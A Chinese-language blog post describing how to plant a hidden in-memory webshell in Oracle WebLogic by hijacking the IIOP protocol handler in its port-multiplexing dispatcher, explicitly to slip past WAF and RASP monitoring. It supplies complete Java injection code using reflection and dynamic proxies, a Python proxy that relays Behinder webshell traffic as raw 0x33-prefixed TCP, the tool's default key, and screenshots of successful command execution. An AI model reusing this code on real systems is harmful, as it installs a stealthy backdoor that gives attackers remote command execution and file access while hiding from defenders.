---
pubDatetime: 2026-06-16
title: "基于WebLogic多协议复用机制的隐蔽内存马注入"
postSlug: weblogic-memory-shell
featured: true
draft: false
tags:
  - WebLogic
  - 代码审计
  - 内存马
  - Java
description: "利用WebLogic单端口多协议复用机制，在协议分发层劫持IIOP Handler注入自定义内存马，绕过WAF和RASP的检测与监控。"
ogImage: "/images/weblogic-memory-shell/01.png"
---

某次项目中遇到一套 WebLogic 环境：WebLogic Server 12.2.1.x，单端口 7001 对外。边界 WAF 严格拦截了常规 HTTP 协议的恶意 Payload；RASP 系统对 Servlet/Filter 内存马的注册和调用进行了严密监控。

但有个细节——7001 这个端口不只是 HTTP。WebLogic 的单端口复用机制让它同时承载 T3、IIOP、LDAP、SNMP、HTTP 五种协议。

这就引出一个想法：**能不能不走 HTTP 层？** 如果能在协议分发那层——就是 WebLogic 判断"这个连接归谁"的地方——插一个自定义处理器，后续通信都由劫持后的 handler 直接处理，完全不经过 HTTP 层。

## 一、本地调试：定位协议分发

### 调试环境

```
攻击机 Windows ──── 192.168.220.132 ──── Docker: cve-2020-14882-weblogic-1
                                                        │ WebLogic 12.2.1.3
                                                        │ 端口 7001（五种协议复用）
                                                        │ JDWP 8453（远程调试）
```

IDEA 配 Remote JVM Debug，Host `192.168.220.132`，Port `8453`。WebLogic 源码从 Docker 拉出来挂到 IDEA 里当 Library：

```bash
docker cp cve-2020-14882-weblogic-1:/u01/oracle/wlserver/modules → Windows
IDEA → Project Structure → Libraries → 添加该目录
```

![调试环境总览](/images/weblogic-memory-shell/01.png)

VM 上同时跑着 tcpdump 抓包：

```bash
sudo tcpdump -i lo -s 0 -w /tmp/debug.pcap port 7001 &
```

### 第一步：从 HTTP GET 入手追踪协议分发

![浏览器访问 7001 端口](/images/weblogic-memory-shell/02.png)

浏览器直接访问 `http://192.168.220.132:7001/`，走 HTTP。在 `MuxableSocketDiscriminator` 的分发逻辑下断点，这个 HTTP GET 一过来就命中。

![isMessageComplete 断点命中](/images/weblogic-memory-shell/03.png)

断点命中后，IDEA 的 Frames 面板显示完整调用栈，往上翻看到了 `isMessageComplete()`，里面有完整的协议认领逻辑（代码是基于 IDEA 反编译还原的）：

```java
public boolean isMessageComplete() {
    int maxBytesReqd = 0;
    for (int i = 0; i < this.channels.length; ++i) {
        // channels → 对应协议 → 对应协议处理器
        ProtocolHandler h = this.channels[i].getProtocol().getHandler();  
        if (h.claimSocket(this.head)) {
            this.claimedChannel = this.channels[i];
            this.claimedHandler = h;
            break;
        }
        maxBytesReqd = Math.max(maxBytesReqd, h.getHeaderLength());
    }
    if (this.availBytes < maxBytesReqd) {
        return false;
    } else if (this.claimedChannel == null) {
        SocketLogger.logConnectionRejected(...);
        return false;
    } else {
        return true;
    }
}
```

我的理解这其实是策略模式：每个 `ProtocolHandler` 是一个策略，`claimSocket(head)` 是判断条件——"这个连接可不可以处理？"遍历 channels，按数组顺序依次询问，谁先匹配就归谁处理。只不过 WebLogic 额外加了一个 `maxBytesReqd` 约束，不是无条件依次询问，而是先看数据量够不够。

两个值得注意的点：

一是 `maxBytesReqd`——遍历过程中会收集每个 handler 要求的头长度，如果当前收到的字节还不够，直接返回 false，后面的 handler 根本不会被问到。

二是循环外还有一个 `availBytes < maxBytesReqd` 的检查——T3 handler 的 `getHeaderLength()` 返回 19，如果数据不够 19 字节，即使前面的 handler 认领失败，也不会继续往后问。这就是为什么不能随便找个位置加自定义 handler——如果放在 HTTP 后面，T3 已经把 `maxBytesReqd` 拉到了 19，短包（比如 4 字节的自定义标识 `0x33` + 命令）根本过不了这个检查。

停在这一帧，Alt+F8 挖字段。先看 `this.head`——是个 Chunk 对象，两个关键字段：`byte[] buf` 和 `int end`。`buf[0]` 就是连接首字节。

![Alt+F8 查看 this.head](/images/weblogic-memory-shell/04.png)

```
this.head: weblogic.utils.io.Chunk@4fde08c8
  end: 435
  buf[0]: 0x47  →  'G'  (HTTP GET 的首字母)
```

HTTP GET请求首字节 `G`（0x47），HTTP handler 的 `claimSocket` 认这个。接着看 `this.channels`——5 个元素，逐个 Alt+F8：

![Alt+F8 查看 this.channels](/images/weblogic-memory-shell/05.png)

```
channels[0] → Default[iiop] → handler = ProtocolHandlerIIOP
channels[1] → Default[t3]   → handler = ProtocolHandlerT3
channels[2] → Default[ldap] → handler = ProtocolHandlerLDAP
channels[3] → Default[snmp] → handler = ProtocolHandlerSNMP
channels[4] → Default[http] → handler = ProtocolHandlerHTTP
```

IIOP 在第一位。如果 IIOP handler 的 `claimSocket` 认了某个首字节，for 循环直接 break。关键是**IIOP handler 只认自己协议的固定字节头**。如果能把它的行为改成认 `0x33`的信息头，后续所有以 `0x33` 开头的连接就全归内存马管。

![F7 进入 claimSocket 查看匹配逻辑](/images/weblogic-memory-shell/06.png)

### 第二步：channels 的来源

确认 `channels` 是核心之后，要搞清楚它从哪来。把断点从 `isMessageComplete()` 往前移，打在 `MuxableSocketDiscriminator` 的构造函数上（`this.channels = channels` 这个赋值语句）。

![MuxableSocketDiscriminator 构造函数断点](/images/weblogic-memory-shell/07.png)

重新发包触发后，Frames 面板往上翻，调用来源是：

```java
// weblogic.server.channels.ServerSocketWrapper.createMuxableSocketForRegister()
rs = new MuxableSocketDiscriminator(s, this.channels);
```

![createMuxableSocketForRegister 源码](/images/weblogic-memory-shell/08.png)

分发器拿到的 `channels` 是 `ServerSocketWrapper` 的同名字段。从构造函数的调用栈继续上溯，看到了 `ServerListenThread`——一个长生命周期后台线程。每次新连接进来，这个线程调用 `createMuxableSocketForRegister()`，把 `ServerSocketWrapper.channels` 传进去。

所以，如果改了 wrapper 的 `channels`，后续所有连接都会用改过的版本。

### 第三步：拿到 ServerSocketWrapper

![ServerListenThread 断点命中](/images/weblogic-memory-shell/09.png)

`ServerListenThread` 持有 `ServerSocketWrapper`，但怎么拿到它？

先在 IDEA 里对 `ServerListenThread.processSockets()` 内部打断点，看到了这行：

```java
ServerSocketWrapper serverSocket = (ServerSocketWrapper) key.attachment();
```

说明 `ServerSocketWrapper` 是作为 `SelectionKey` 的 attachment 挂载的。注入代码需要复现这个路径。

第一步，通过 `Thread.getAllStackTraces()` 按线程名找到 `ServerListenThread` 实例：

```java
Object serverListenThread = null;
for (Thread th : Thread.getAllStackTraces().keySet()) {
    if ("weblogic.socket.ServerListenThread".equals(th.getName())) {
        serverListenThread = th;
        break;
    }
}
```

第二步，从线程实例拿到 `ServerSocketWrapper`。先试了文档中提到的 `registerList` 字段——但在 NIO 模式下始终为空。回头用 Alt+F8 看线程对象有哪些字段，`getDeclaredFields()` 列出了 `selector`，顺着它往下走：

```java
Field sf = serverListenThread.getClass().getDeclaredField("selector");
sf.setAccessible(true);
Selector sel = (Selector) sf.get(serverListenThread);

for (SelectionKey key : sel.keys()) {
    Object att = key.attachment();
    if (att != null && att.getClass().getName().contains("ServerSocketWrapper")) {
        // 拿到了 ServerSocketWrapper
    }
}
```

`selectionKey.attachment()` 不是可有可无的附加数据——WebLogic 就是通过它把 `ServerSocketWrapper` 关联到事件循环上的。拿到 wrapper 后，反射读 `channels` 字段就拿到了整个`channels[]`数组。

### 第四步：实际分发状态

**即使注册表里新增了协议项，`ServerSocketWrapper.channels` 数组并不会自动更新。** 新连接进来，分发器用的还是旧的 channels。锁定四个对象就够了：

1. `ServerListenThread` — 入口线程
2. `ServerSocketWrapper` — 持有 channels
3. `channels[]` — 协议通道数组
4. `ProtocolHandler` — 每个通道里的协议处理器

### 对象关系图

```
ServerListenThread (一直运行的主监听线程)
│
├── selector: NIO Selector (监听 7001 的所有事件)
│   │
│   ├── SelectionKey
│   │   └── attachment() --> ServerSocketWrapper
│   │       │
│   │       └── channels[]  <--- 注入改的就是这个
│   │           │
│   │           ├── [0] IIOP Channel
│   │           │       └── Protocol
│   │           │           └── handler  <--- 目标
│   │           │
│   │           ├── [1] T3 Channel
│   │           ├── [2] LDAP Channel
│   │           ├── [3] SNMP Channel
│   │           └── [4] HTTP Channel
│   │
│   └── ... (更多 SelectionKey)
│
└── processSockets(): accept() --> dispatch() --> ...
```

请求进来时的分发路线：

```
TCP 连接到达 7001
      │
      ▼
ServerListenThread.accept()
      │
      ▼
MuxableSocketDiscriminator.isMessageComplete()
      │
      ├── [0] IIOP: claimSocket(0x33) → true → 选中，后续走 handleT33
      ├── [1] T3:   不会走到（for 循环已 break）
      ├── [2] LDAP: 不会走到
      ├── [3] SNMP: 不会走到
      └── [4] HTTP: 不会走到
```

HTTP 容器不是网络入口的第一站——更底层的分发器先决定了连接归谁。只盯着 Servlet/Filter 层，就错过了这个攻击面。

---

## 二、注入：劫持 IIOP Handler

有了对象链，下一步是用反射和 Proxy 改写它。目标是让 IIOP handler 认领一个自定义协议（首字节 `0x33`），并把后续处理交给自定义代码。

### 为什么选 IIOP（channels[0]）而不是 HTTP（channels[4]）

`MuxableSocketDiscriminator` 在调用 `claimSocket()` 之前有一个 `maxBytesReqd` 检查。它取所有 handler 的 `getHeaderLength()` 最大值，要求收到的数据量达到这个值才会开始遍历。T3 handler 返回 19。如果在 HTTP 位置（channels[4]）注入自定义 handler，只发 4 字节的自定义包（`0x33` + `id\n`）过不了检查。**IIOP 在第一位，`claimSocket()` 返回 true 后立即 break，不检查后续。** 所以劫持 IIOP。

### 注入代码

```java
static void inject() throws Exception {
    // 1. 在所有线程中找 ServerListenThread（WebLogic 主监听线程，永远不死）
    Object t = null;
    for (Thread th : Thread.getAllStackTraces().keySet()) {
        if ("weblogic.socket.ServerListenThread".equals(th.getName()))
            { t = th; break; }
    }
    if (t == null) return;

    // 2. 从线程的 selector 字段 → SelectionKey.attachment() → ServerSocketWrapper
    //    ServerListenThread 用 NIO Selector 监听端口，attachment 里挂着 wrapper
    Field sf = t.getClass().getDeclaredField("selector"); sf.setAccessible(true);
    java.nio.channels.Selector sel = (java.nio.channels.Selector) sf.get(t);
    Object wrapper = null;
    for (java.nio.channels.SelectionKey k : sel.keys()) {
        Object att = k.attachment();
        if (att != null && att.getClass().getName().contains("ServerSocketWrapper"))
            { wrapper = att; break; }
    }
    if (wrapper == null) return;

    // 3. wrapper.channels[0] → IIOP 的 Protocol → ProtocolHandler
    //    channels[0] 是 IIOP，劫持它的 handler 实现 0x33 协议认领
    Field cf = wrapper.getClass().getDeclaredField("channels"); cf.setAccessible(true);
    Object[] channels = (Object[]) cf.get(wrapper);
    Object iiopChan = channels[0];
    Object iiopProto = iiopChan.getClass().getMethod("getProtocol").invoke(iiopChan);
    final Object iiopHandler = iiopProto.getClass().getMethod("getHandler").invoke(iiopProto);

    // 4. 用 Proxy 包装原始 handler：0x33 流量自己处理，其余原样转发
    Class<?> handlerIface = Class.forName("weblogic.protocol.ProtocolHandler");
    Object wrapped = Proxy.newProxyInstance(
        handlerIface.getClassLoader(), new Class[]{handlerIface},
        new InvocationHandler() {
            public Object invoke(Object proxy, Method m, Object[] a) throws Throwable {
                // claimSocket：首字节是 0x33 就认领，否则问原始 handler
                if ("claimSocket".equals(m.getName())) {
                    if (getFirstByte(a[0]) == 0x33) return true;
                    return m.invoke(iiopHandler, a);
                }
                // createSocket：0x33 流量交给 handleT33，其余走原始逻辑
                if ("createSocket".equals(m.getName()) && getFirstByte(a[0]) == 0x33) {
                    return handleT33(a);
                }
                return m.invoke(iiopHandler, a);
            }
        });

    // 5. 把 Protocol 对象里的 handler 字段替换成 Proxy
    for (Field f : iiopProto.getClass().getDeclaredFields()) {
        if (f.getType().getName().contains("ProtocolHandler")) {
            f.setAccessible(true); f.set(iiopProto, wrapped);
        }
    }
}
```

**为什么用 Proxy 而不是自己实现接口**：

最开始尝试写一个 `implements ProtocolHandler` 的类，编译直接报错——找不到 `ProtocolHandler` 这个接口。原因：注入的 class 由远程 `URLClassLoader` 加载，这个 ClassLoader 是 WebLogic 临时创建的，只负责从攻击机 HTTP 下载 class。它的父级是 JDK 的 `AppClassLoader`，而 `ProtocolHandler` 接口在 WebLogic 自己的 `GenericClassLoader` 里——子 ClassLoader 往上找父级，找不到 WebLogic 的内部类。

用`Proxy.newProxyInstance(handlerIface.getClassLoader(), ...)` 在 WebLogic 的 ClassLoader 里生成代理类，就可以访问 WebLogic 内部类型了，就绕开了这个限制。

注入后，handler 变成了这样：

```
channels[0]
  └── Protocol
        └── handler: [$Proxy@xxxx]     <--- 动态代理
              │
              ├── claimSocket(0x33)    --> 认领
              ├── claimSocket(其他)     --> 转发给原始 handler
              ├── createSocket(0x33)   --> handleT33 (冰蝎内存马)
              └── createSocket(其他)    --> 转发给原始 handler
                    │
                    └── [ProtocolHandlerIIOP@xxxx]  <--- 被封装在里面
```

### 注入效果验证

注入后，回到 `isMessageComplete()` 设断点，Alt+F8 执行 `this.channels[0].getProtocol().getHandler()`：

![注入后 IIOP handler 变为 T33BehinderShell](/images/weblogic-memory-shell/10.png)

结果不再是 `ProtocolHandlerIIOP@xxxx`，而是 `T33BehinderShell$1@4739`——匿名 InvocationHandler 的实例。展开后能看到内部的 `iiopHandler` 还是指向原始 `ProtocolHandlerIIOP`，对应于代码里 `m.invoke(iiopHandler, a)` 的 fallback。对比注入前的截图 05，确认 IIOP handler 已被替换。

---

## 三、构造协议层运行的冰蝎内存马

### 3.1 冰蝎 v4.1 工作流程

冰蝎每个请求发送一个完整的 Java payload class，服务端 `defineClass` 后调 `equals(PageContext)` 执行：

| | 说明 |
|------|------|
| 请求格式 | 裸 `base64(AES/ECB(class_bytes))` |
| 响应格式 | 裸二进制（payload 直接写入 OutputStream） |
| 调用入口 | `payload.equals(pageContext)` 一次调用 |
| 密钥 | `md5("rebeyond")[0:16]` = `e45e329feb5d925b` |

### 3.2 关键的 `contains()` 类型检查

冰蝎 payload 的 `fillContext` 不是用 `instanceof`，而是用类名字符串匹配：

```java
if (obj.getClass().getName().contains("PageContext")) {
    this.Request  = obj.getClass().getMethod("getRequest").invoke(obj);
    this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
    this.Session  = obj.getClass().getMethod("getSession").invoke(obj);
}
```

#### 3.2.1 从 Servlet 到 IIOP：缺了什么

IIOP 劫持做完后，`handleT33` 能收到数据了，`defineClass` 之后拿到了 payload 实例。到这里都很顺——照着冰蝎的原生内存马那一行写就行了：

```java
new U(classLoader).g(解密后的字节).newInstance().equals(pageContext);
```

但接下来卡住了——往 `equals()` 里传什么？最初看冰蝎 JSP，传的是 `pageContext`，一个 JSP 内置对象。后来研究 Java Memshell Generator 的 Servlet 内存马，传的是真实的 `request` / `response` / `session`。不管哪种，都依赖 Servlet 容器。weblogic IIOP 层别说这些了，连 Servlet API 都没碰过。

先搞清楚 `pageContext` 背后到底给了什么。`pageContext` 是 Servlet 上下文的一部分，上面挂了四个属性：

- **request** — 当前请求对象（`HttpServletRequest`），payload 从这里拿参数
- **response** — 当前响应对象（`HttpServletResponse`），payload 往这里写结果
- **session** — 会话对象（`HttpSession`），跨请求存临时状态
- **servletContext** — 全局上下文对象（`ServletContext`），拿文件路径之类的

这四个属性都通过 getter 方法暴露：`pageContext.getRequest()`、`pageContext.getResponse()` 等等。

冰蝎的工作机制比较灵活——每条操作（命令执行、文件管理、数据库操作）都由客户端生成一个 class，加密发给服务端，服务端只负责 `defineClass` 加进内存、调 `equals()` 执行。服务端本身没有业务逻辑，就是一个类加载器入口。

所以 IIOP 层有没有 Servlet 上下文根本不重要——只要 `equals()` 收到的对象能响应那三四个 getter，payload 就能跑完。它不检查类型，不关心里面是真的 Servlet 还是手搓的 POJO。

#### 3.2.2 冰蝎 payload 的两套 fillContext

在研究 Java Memshell Generator 这个工具的payload时，发现它生成的 payload 里 `fillContext` 还支持另一种写法——直接传 Map：

```java
if (obj.getClass().getName().contains("PageContext")) {
    // 方式一：Servlet/JSP 环境，反射提取
    this.Request  = obj.getClass().getMethod("getRequest").invoke(obj);
    this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
    this.Session  = obj.getClass().getMethod("getSession").invoke(obj);
} else {
    // 方式二：非 Servlet 环境，直接从 Map 取
    Map<String, Object> objMap = (Map<String, Object>) obj;
    this.Request  = objMap.get("request");
    this.Response = objMap.get("response");
    this.Session  = objMap.get("session");
}
```

方式一JSP/Filter 那种方式得造好几个假 POJO。

方式二只需要一个 HashMap + 一个带 `getWriter()`/`getOutputStream()` 的假 Response。`fillContext` 本来就考虑了非 Servlet 环境的场景。

所以最终方案：构造一个 HashMap 封装 `"request"` / `"response"` / `"session"` 三个键，值分别是

- FakeRequest（只返回 `"POST"`）
- FakeResponse（`ByteArrayOutputStream` 接结果）
- 一个空 HashMap

传给 `payload.equals(map)`，冰蝎 payload 的 `fillContext` 收到后走 `else` 分支，从 Map 里取 `"request"`、`"response"`、`"session"`。

### 3.3 代理转发

冰蝎客户端只发 HTTP POST，服务端内存马只收 `0x33` 裸 TCP，两边协议对不上。中间加一个本地代理做转换。流量流向：

```
冰蝎               本地代理                  WebLogic 7001

HTTP POST /  -->  剥离HTTP头，提取body
                  拼上 0x33 前缀  -------->  0x33 + body
                                            │
                                            IIOP handler
                                            claimSocket(0x33) = true
                                            handleT33()
                                              解密 --> 执行 --> 响应
                                            │
HTTP 200 OK  <--  包装HTTP响应  <--------  裸字节响应
```

用 Python 写一个本地代理做协议转换：

```python
#!/usr/bin/env python3
import socket, threading, sys

LOCAL_PORT  = int(sys.argv[1])
TARGET      = sys.argv[2]
TARGET_PORT = int(sys.argv[3])

def handle(client):
    data = b''
    while b'\r\n\r\n' not in data:
        data += client.recv(4096)
    parts = data.split(b'\r\n\r\n', 1)
    body = parts[1] if len(parts) > 1 else b''

    # 补读 Content-Length 未读完的 body
    cl = 0
    for line in data.split(b'\r\n'):
        if line.lower().startswith(b'content-length:'):
            try: cl = int(line.split(b':', 1)[1].strip())
            except: pass
    while len(body) < cl:
        body += client.recv(4096)

    # 加自定义字节头，发到 WebLogic
    t33_payload = b'\x33' + body
    server = socket.socket(); server.settimeout(10)
    server.connect((TARGET, TARGET_PORT))
    server.sendall(t33_payload)

    # 收响应
    server.settimeout(5)
    resp = b''
    try:
        while True:
            chunk = server.recv(4096)
            if not chunk: break
            resp += chunk
    except: pass
    server.close()

    # 包装为 HTTP 响应返回给冰蝎
    http_resp = (b"HTTP/1.1 200 OK\r\nContent-Length: " +
                 str(len(resp)).encode() + b"\r\nConnection: close\r\n\r\n" + resp)
    client.sendall(http_resp)
    client.close()

def main():
    listen = socket.socket()
    listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen.bind(('127.0.0.1', LOCAL_PORT))
    listen.listen(10)
    print(f'Proxy: 127.0.0.1:{LOCAL_PORT} -> {TARGET}:{TARGET_PORT}')
    while True:
        c, _ = listen.accept()
        threading.Thread(target=handle, args=(c,), daemon=True).start()

if __name__ == '__main__':
    main()
```

### 3.4 验证

冰蝎连接 `http://127.0.0.1:8889/`，密码 `rebeyond`：

![冰蝎连接成功 - 文件管理](/images/weblogic-memory-shell/11.png)

![冰蝎连接成功 - 命令执行](/images/weblogic-memory-shell/12.png)

文件管理和命令执行正常。

### 3.5 断点：冰蝎流量进入 handleT33

在 `handleT33()` 入口处打断点，冰蝎执行命令后命中：

![T33BehinderShell 断点命中](/images/weblogic-memory-shell/13.png)

Frames 面板显示完整的调用链：`Proxy.invoke() → handleT33()`，证明冰蝎加密流量确实走到了自定义代码。Variables 面板的 `body` 变量就是冰蝎发来的 base64 密文。

动态注入的 class 为什么能断点调试？JVM 的调试协议只看栈帧里的类名和行号，不关心这个 class 是怎么加载的。

### 3.6 流量分析

冰蝎到 WebLogic 之间的流量是什么样的？先看通信路径：

```
冰蝎 ──HTTP POST──→ 本地代理 ──0x33 + body──→ WebLogic 7001
       ←──HTTP 200──                    ←── 裸字节响应 ──

HTTP 到本地代理就停了。WebLogic 收到的不是 HTTP，是自定义字节流。
```

在 VM 上抓包，Wireshark 打开后只看到 TCP 三次握手和一堆无法解析的二进制数据——没有 `GET`、没有 `POST`、没有 `200 OK`：

![Wireshark 总览 - 四次连接](/images/weblogic-memory-shell/14.png)

拆开一次连接的完整过程：

![Wireshark 单次连接 - Follow TCP Stream](/images/weblogic-memory-shell/15.png)

请求方向以 `0x33` 开头，后面全是 base64 密文；响应方向是 payload 执行结果的原生字节，Wireshark 没有对应协议的解析器。
